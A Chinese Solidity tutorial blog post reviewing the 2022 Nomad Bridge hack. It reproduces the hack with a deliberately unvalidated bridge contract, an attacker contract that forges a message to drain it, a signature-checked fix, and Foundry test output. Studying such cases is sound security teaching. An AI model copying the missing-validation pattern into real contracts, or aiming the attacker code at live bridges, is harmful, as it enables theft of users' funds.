---
layout: post
title: 《纸上谈兵·solidity》第 30 课：智能合约安全审计案例复盘 -- Nomad Bridge(2022)
tags: solidity
mermaid: false
math: false
---  

Nomad 是一个跨链消息传递协议，旨在实现不同区块链之间的安全通信。它通过一种乐观机制，允许用户在无需中介验证的情况下发送消息，并通过欺诈证明来保障安全性。这种设计使得 Nomad 成为一个去中心化且高效的跨链解决方案。

---

## 1. Nomad 的工作原理

* **乐观机制**：Nomad 允许消息在无需立即验证的情况下传递，接收链上的观察者可以在规定时间内提出挑战，以确保消息的有效性。
* **去中心化安全性**：通过去中心化的观察者网络，Nomad 实现了无需信任中介的安全性。
* **低成本**：与传统的跨链桥相比，Nomad 的设计显著降低了交易费用。
* **可扩展性**：开发者可以利用 Nomad 的 SDK 构建跨链应用程序，无需关心底层的跨链通信细节。

---

## 2. 2022 年 Nomad 桥接事件

2022 年 8 月，Nomad 桥接遭遇了重大安全漏洞，导致约 1.9 亿美元的资产被盗。

* **漏洞原因**：在一次智能合约更新中，Nomad 引入了一个验证错误，使得恶意用户可以伪造有效的消息证明，绕过验证机制。
* **攻击方式**：攻击者复制了有效的消息格式，触发了合约中的资金转移功能，导致大量资金被盗。
* **影响范围**：此次攻击涉及多个资产，包括 ETH、USDC、WBTC 等，影响了多个链上的用户。
* **后续处理**：事件发生后，Nomad 团队迅速修复了漏洞，并与社区合作追回部分被盗资产。

---

## 3. 关键人物被捕

2025 年 5 月，涉嫌参与 2022 年 Nomad 桥接攻击的关键人物亚历山大·古列维奇（Alexander Gurevich）在以色列被捕，并被引渡至美国接受审判。

---

## 4. 安全建议

* **使用多重签名钱包**：避免将大量资产存放在单一地址。
* **定期审计智能合约**：确保合约代码的安全性，及时修复发现的漏洞。
* **关注官方通告**：及时了解协议方发布的安全更新和公告。

## 5. 攻击复现实验

`VulnerableBridge.sol` 是一个模拟 Nomad 桥接合约的智能合约，它包含了一个验证错误，使得攻击者可以伪造有效的消息证明，绕过验证机制。  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title 漏洞版跨链桥（Nomad Hack复现）
/// @notice 没有验证消息合法性，任何人都能调用 process 提款
contract VulnerableBridge {
    mapping(bytes32 => bool) public processed;

    /// @notice 存款
    function deposit() external payable {}

    /// @notice 处理跨链消息（没有验证签名或Merkle证明）
    function process(bytes32 txHash, address to, uint256 amount) external {
        require(!processed[txHash], "already processed");

        // 没有验证消息是否真实，任何人都能调用
        processed[txHash] = true;

        payable(to).transfer(amount);
    }

    /// @notice 合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

`SecureBridge.sol` 是一个修复了验证错误的跨链桥合约，它通过验证消息的签名和 Merkle 证明，确保了只有合法的跨链消息才能被处理。  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title 修复后的跨链桥
/// @notice 使用签名验证防止伪造消息
contract SecureBridge {
    mapping(bytes32 => bool) public processed;
    address public validator; // 可信验证者

    constructor(address _validator) {
        validator = _validator;
    }

    /// @notice 存款
    function deposit() external payable {}

    /// @notice 处理跨链消息（需要签名验证）
    /// @param txHash 跨链交易哈希
    /// @param to 接收者
    /// @param amount 金额
    /// @param signature 验证者签名
    function process(
        bytes32 txHash,
        address to,
        uint256 amount,
        bytes memory signature
    ) external {
        require(!processed[txHash], "already processed");

        // 恢复签名者地址
        bytes32 message = prefixed(keccak256(abi.encodePacked(txHash, to, amount)));
        address signer = recoverSigner(message, signature);

        require(signer == validator, "invalid signature");

        processed[txHash] = true;
        payable(to).transfer(amount);
    }

    /// @notice 生成以太坊前缀消息
    function prefixed(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }

    /// @notice 从签名中恢复签名者地址
    function recoverSigner(bytes32 message, bytes memory sig) internal pure returns (address) {
        require(sig.length == 65, "invalid signature length");

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }

        return ecrecover(message, v, r, s);
    }

    /// @notice 合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

`Attacker.sol` 是一个模拟攻击者的智能合约，它通过调用 `VulnerableBridge` 的 `process` 函数，绕过了验证机制，实现了对合约余额的提款。  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBridge.sol";

/// @title 攻击合约 - 模拟 Nomad Bridge Hack
contract BridgeAttacker {
    VulnerableBridge public bridge;
    address public owner;

    constructor(address _bridge) {
        bridge = VulnerableBridge(_bridge);
        owner = msg.sender;
    }

    /// @notice 假造一笔消息，直接提走资金
    function fakeMessage(bytes32 fakeTxHash, uint256 amount) external {
        bridge.process(fakeTxHash, owner, amount);
    }
}
```  

`NomadFixTest.t.sol` 是一个测试脚本，用于模拟攻击者对 `VulnerableBridge` 的攻击。  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableBridge.sol";
import "../src/SecureBridge.sol";
import "../src/BridgeAttacker.sol";

/// @title Nomad Bridge 修复对比测试
contract NomadFixTest is Test {
    VulnerableBridge vulnBridge;
    SecureBridge secureBridge;
    BridgeAttacker attacker;

    address deployer = address(0x1234);
    address hacker = address(0x2345);
    address validator = address(0x3456);

    function setUp() public {
        vm.deal(deployer, 20 ether);

        // 部署漏洞版桥，存入资金
        vm.startPrank(deployer);
        vulnBridge = new VulnerableBridge();
        vulnBridge.deposit{value: 10 ether}();

        // 部署修复版桥，存入资金
        secureBridge = new SecureBridge(validator);
        secureBridge.deposit{value: 10 ether}();
        vm.stopPrank();
    }

    /// @notice 漏洞版桥 -> 攻击成功
    function testExploitOnVulnerableBridge() public {
        attacker = new BridgeAttacker(address(vulnBridge));

        emit log_named_uint("VulnBridge Balance Before", address(vulnBridge).balance);

        vm.prank(hacker);
        attacker.fakeMessage(keccak256("fake_tx"), 10 ether);

        emit log_named_uint("VulnBridge Balance After", address(vulnBridge).balance);
        emit log_named_uint("Attacker Balance After", address(hacker).balance);

        assertEq(address(vulnBridge).balance, 0, "VulnBridge should be drained");
    }

    /// @notice 修复版桥 -> 攻击失败
    function testExploitOnSecureBridge() public {
        attacker = new BridgeAttacker(address(secureBridge));

        emit log_named_uint("SecureBridge Balance Before", address(secureBridge).balance);

        vm.prank(hacker);
        vm.expectRevert(); // ⚠️ 没有签名，调用会失败
        attacker.fakeMessage(keccak256("fake_tx"), 10 ether);

        emit log_named_uint("SecureBridge Balance After", address(secureBridge).balance);

        assertEq(address(secureBridge).balance, 10 ether, "SecureBridge funds safe");
    }

    receive() external payable {}
}
```  

执行测试：  

```bash
➜  tutorial git:(main) ✗ forge test --match-path test/NomadHack.t.sol -vvv
[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.30
[⠑] Solc 0.8.30 finished in 531.22ms
Compiler run successful!

Ran 2 tests for test/NomadHack.t.sol:NomadFixTest
[PASS] testExploitOnSecureBridge() (gas: 300074)
Logs:
  SecureBridge Balance Before: 10000000000000000000
  SecureBridge Balance After: 10000000000000000000

[PASS] testExploitOnVulnerableBridge() (gas: 332429)
Logs:
  VulnBridge Balance Before: 10000000000000000000
  VulnBridge Balance After: 0
  Attacker Balance After: 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 8.03ms (2.59ms CPU time)

Ran 1 test suite in 168.00ms (8.03ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

---

<div align="center">
  <img src="../img/qrcode_wechat.jpg" alt="孟斯特">
</div>

> 声明：本作品采用[署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)进行许可，使用时请注明出处。  
> Author: [mengbin](mengbin1992@outlook.com)  
> blog: [mengbin](https://mengbin.top)  
> Github: [mengbin92](https://mengbin92.github.io/)  
> 腾讯云开发者社区：[孟斯特](https://cloud.tencent.com/developer/user/6649301)  
---